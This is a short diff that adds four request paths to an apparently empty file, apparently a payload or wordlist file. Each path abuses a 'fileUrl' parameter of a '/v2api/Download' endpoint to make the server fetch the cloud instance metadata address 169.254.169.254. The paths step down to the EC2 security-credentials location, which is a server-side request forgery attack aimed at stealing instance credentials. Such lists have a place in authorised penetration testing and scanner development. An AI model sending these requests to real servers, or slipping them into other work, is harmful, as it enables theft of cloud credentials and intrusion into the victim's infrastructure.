@@ -1,1 +1,4 @@
-
+/v2api/Download?fileUrl=http://169.254.169.254/
+/v2api/Download?fileUrl=http://169.254.169.254/latest/meta-data/
+/v2api/Download?fileUrl=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/
+/v2api/Download?fileUrl=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
